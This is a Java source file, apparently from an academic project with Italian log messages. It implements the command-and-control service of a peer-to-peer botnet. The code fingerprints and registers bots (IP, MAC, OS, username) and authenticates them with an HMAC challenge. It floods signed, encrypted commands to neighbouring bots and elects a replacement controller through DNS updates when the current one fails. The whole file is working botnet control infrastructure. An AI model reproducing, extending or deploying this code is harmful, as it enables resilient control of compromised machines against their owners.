package cs.sii.control.command;

import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.SignatureException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import java.util.Set;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.jgrapht.UndirectedGraph;
import org.jgrapht.graph.DefaultEdge;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import cs.sii.bot.action.Auth;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.network.request.BotRequest;
import cs.sii.network.request.CecRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.connection.P2PMan;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Service("Commando")
public class Commando {

	@Autowired
	private Auth auth;

	@Autowired
	private CecRequest ccReq;

	@Autowired
	private BotRequest bReq;

	@Autowired
	private BotServiceImpl bServ;

	@Autowired
	private RoleServiceImpl rServ;

	@Autowired
	private UserServiceImpl uServ;

	@Autowired
	private NetworkService nServ;

	@Autowired
	private P2PMan pServ;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private CryptoUtils crypto;

	/**
	 * 
	 */
	public Commando() {
		super();
	}

	/**
	 * 
	 */
	public void initializeCeC() {

		Pairs<IP, String> botAlive = new Pairs<IP, String>(nServ.getMyIp(), nServ.getIdHash());
		nServ.getAliveBot().add(botAlive);
		pServ.initP2P();
		System.out.println("peer to peer fatto");

		//// TESTING
		// Role admin=new Role("ADMIN");
		// rServ.save(admin);
		// Set<Role> roleSet=new HashSet<Role>();
		// roleSet.add(admin);
		// uServ.save(new User("admin","admin", "a", "b", "ad", roleSet));
		////////

		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(), (nServ.isElegible() + ""));
		bServ.save(bot);
		
	}

	/**
	 * @param idBot
	 * @return
	 */
	public Pairs<Long, Integer> authReq(String idBot) {
		System.out.println("Inizio fase di autenticazione BotToCec");
		Pairs<Long, Integer> response;
		if (auth.getBotSeed().indexOfValue1(idBot) >= 0)
			return auth.getBotSeed().getByValue1(idBot).getValue2();
		Long keyNumber = new Long(auth.generateNumberText());
		Integer iterationNumber = new Integer(auth.generateIterationNumber());
		System.out.println("KeyNumber: " + keyNumber);
		System.out.println("IterationNumber: " + iterationNumber);
		System.out.println("Idbot: " + idBot);
		auth.getBotSeed().add(new Pairs<String, Pairs<Long, Integer>>(idBot, new Pairs<Long, Integer>(keyNumber, iterationNumber)));
		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
		System.out.println("Fine generazione chiavi di autenticazione BotToCec");
		return response;
	}

	/**
	 * @param objects
	 * @return
	 */
	public String checkHmac(ArrayList<Object> objects) {
		System.out.println("Inizio fase di verifica Hmac BotToCec");
		String response = "";
		String idBot = objects.get(0).toString();
		String hashMac = objects.get(7).toString();
		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
		if (lista != null) {
			Pairs<String, Pairs<Long, Integer>> elem = lista.removeByValue1(idBot);
			Pairs<Long, Integer> coppia = elem.getValue2();
			if (coppia != null) {
				Long keyNumber = coppia.getValue1();
				Integer iterationNumber = coppia.getValue2();
				if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
					response = "Challenge OK";
					objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
					Bot bot;
					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(), objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(), objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
					bServ.save(bot);
					Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
					nServ.getAliveBot().add(botAlive);
				}
			}
		}
		System.out.println("Fine verifica Hmac BotToCec");
		return response;

	}

	/**
	 * @param data
	 * @return
	 * @throws BadPaddingException
	 * @throws IllegalBlockSizeException
	 * @throws InvalidAlgorithmParameterException
	 * @throws UnsupportedEncodingException
	 * @throws NoSuchPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws InvalidKeyException
	 */
	public byte[] getNeighbours(String data) {
		return pServ.getNeighbours(data);
	}

	/**
	 * @param cmd
	 * @param userSSoID
	 */
	@Async
	public void floodingByUser(String cmd, String userSSoID) {
		User user = uServ.findBySsoId(userSSoID);
		if (user != null) {
			flooding(cmd);
		}
		return;
	}

	/**
	 * @param cmd
	 * @param userSSoID
	 */
	
	@Async
	public void floodingByCecToBot(String cmd, String userSSoID) {
		User user = uServ.findBySsoId(userSSoID);
		if (user != null) {
			flooding(cmd);
		}
		return;
	}

	@Async
	public void flooding(String cmd) {
		String msg = "";
		String request = "";
		System.out.println("creo il messaggio per il flood");
		// aggiungi nonce time.millis
		Long milli = System.currentTimeMillis();
		Random rand = new SecureRandom(milli.toString().getBytes());
		Integer nounce = rand.nextInt();
		String hashIdMsg = crypto.generateSha256(nounce.toString());
		String signature = null;
		try {
			signature = pki.signMessageRSA(hashIdMsg);
			msg = hashIdMsg + "<HH>" + cmd + "<HH>" + signature;
			request = pki.getCrypto().encryptAES(msg);
		} catch (InvalidKeyException | SignatureException e) {
			e.printStackTrace();
			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
		}
		System.out.println("hash " + hashIdMsg);
		System.out.println("cmd " + cmd);
		System.out.println("signature " + signature);
		System.out.println("msg " + msg);
		System.out.println("request " + request);
		startFlood(request);
		return;
	}

	/**
	 * @param pk
	 * @param ip
	 * @return
	 */
	public boolean newKingDns(IP ip, String pk) {
		System.out.println("dns nk");
		return nServ.updateDnsInformation(ip, pk);
	}

	public boolean newKingFlood(IP ip, String pk) {
		String msg = "newking<CC>" + ip + "<CC>" + pk;
		flooding(msg);
		return false;
	}
	
	public boolean updateKingFlood(IP ip, String pk) {
		String msg = "update<CC>" + ip + "<CC>" + pk;
		flooding(msg);
		return false;
	}
	

	public boolean abdicate() {

		System.out.println("dns updating..");
		Bot b = bServ.searchBotId(pServ.getNewKing());
		if (b != null) {
			System.out.println("bot dns" + b.getIp());
			IP ip = new IP(b.getIp());
			String pk = b.getPubKey();
			newKingDns(ip, pk);
			System.out.println("dns updated..");
			System.out.println("start first flood");
			newKingFlood(ip, pk);
			nServ.getCommandConquerIps().remove(0);
			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(ip, pki.rebuildPuK(pk)));
			pServ.setNewKing("");
			nServ.setAliveBot(new SyncIpList<IP,String>());
			nServ.setCounterCeCMemory(1);
			return true;
		}
		return false;
	}

	/**
	 * @param msg
	 */
	public void startFlood(String msg) {
		System.out.println("start flood vicini");
		for (int i = 0; i < nServ.getNeighbours().getSize(); i++) {
			Pairs<IP, PublicKey> pairs = nServ.getNeighbours().get(i);
			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
		}
		System.out.println("fine flood");
	}

	/**
	 * 
	 */
	@Async
	public void startElection() {
		System.out.println("Inizio fase di elezione del nuovo CeC");
		List<Bot> botList = bServ.findAll();
		List<String> ccList = new ArrayList<>();
		if (botList != null) {
			for (Bot bot : botList) {
				if (bot.getElegible().equals("true"))
					if (nServ.getAliveBot().indexOfValue2(bot.getIdBot()) >= 0)
						ccList.add(bot.getIp());
			}
		}

		System.out.println(ccList.remove(nServ.getMyIp().toString()));
		while (pServ.getNewKing().equals("")) {
			if (ccList.size() > 0) {
				Long l = System.currentTimeMillis();
				String s = l.toString() + botList.size();
				byte[] b = s.getBytes();
				Random rnd = new SecureRandom(b);
				Double d = rnd.nextDouble();
				Integer size = (ccList.size() - 1);
				Double rand = d * size;
				Long lv = Math.round(rand);
				Integer li = lv.intValue();
//				System.out.println("long to int" + li);
				String ip = ccList.get(li);
				ccList.forEach((botIp) -> System.out.println("Bot Ip abili per il sorteggio" + botIp));
//				System.out.println("byte seed " + b.toString());
//				System.out.println(" next double " + d);
//				System.out.println("size " + size);
//				System.out.println("rand " + rand);
//				System.out.println("byte seed " + b.toString());
				System.out.println("Ho eletto " + ip);
				if (ccReq.becameCc(ip)) {
					pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
				} else {
					ccList.remove(ip);
				}
				System.out.println("Elezione completata inizio il trasferimento");
			} else {
				System.out.println("Nessuno da eleggere");
				return;
			}
			// elegilo passa i dati
			// passa il potere
		}
	}

	public byte[] syncNeightboursBot(List<String> data) {
		Boolean flag = false;
		String idBot = data.remove(0);
		List<String> deadBotList = data;
		if (!deadBotList.isEmpty()) {
			for (String ipDead : deadBotList) {
				if (nServ.getAliveBot().removeByValue1(new IP(ipDead)) != null) {
					flag = true;
				} else {
					System.out.println("Vicino non presente nella lista dei vicini e del DB");
				}
			}
			if (flag) {
				pServ.updateNetworkP2P();
				return getNeighbours(idBot);
			}
		} else {
			System.out.println("Nessuna modifica da effettuare alla lista dei vivi");
		}
		return null;
	}

	
	public void legacy(){
		Boolean b=bReq.pingToCec(nServ.getCommandConquerIps().get(0).getValue1().toString());
		if(!b){
			newKingDns(nServ.getMyIp(),nServ.getPki().getPubRSAKeyToString());			
			 updateKingFlood(nServ.getMyIp(), nServ.getPki().getPubRSAKeyToString());
		}else{
			System.out.println("CeC vivo e funzionante");
		}
	}
	
	
	public RoleServiceImpl getrServ() {
		return rServ;
	}

	public void setrServ(RoleServiceImpl rServ) {
		this.rServ = rServ;
	}

	public UserServiceImpl getuServ() {
		return uServ;
	}

	public void setuServ(UserServiceImpl uServ) {
		this.uServ = uServ;
	}

	public BotServiceImpl getbServ() {
		return bServ;
	}

	public void setbServ(BotServiceImpl bServ) {
		this.bServ = bServ;
	}

	public NetworkService getnServ() {
		return nServ;
	}

	public void setnServ(NetworkService nServ) {
		this.nServ = nServ;
	}

	public UndirectedGraph<IP, DefaultEdge> getGraph() {
		return pServ.getGraph();
	}

	public BotRequest getbReq() {
		return bReq;
	}

	public void setbReq(BotRequest bReq) {
		this.bReq = bReq;
	}

	public P2PMan getpServ() {
		return pServ;
	}

	public void setpServ(P2PMan pServ) {
		this.pServ = pServ;
	}

	public CryptoUtils getCrypto() {
		return crypto;
	}

	public void setCrypto(CryptoUtils crypto) {
		this.crypto = crypto;
	}

	public CryptoPKI getPki() {
		return pki;
	}

	public void setPki(CryptoPKI pki) {
		this.pki = pki;
	}

}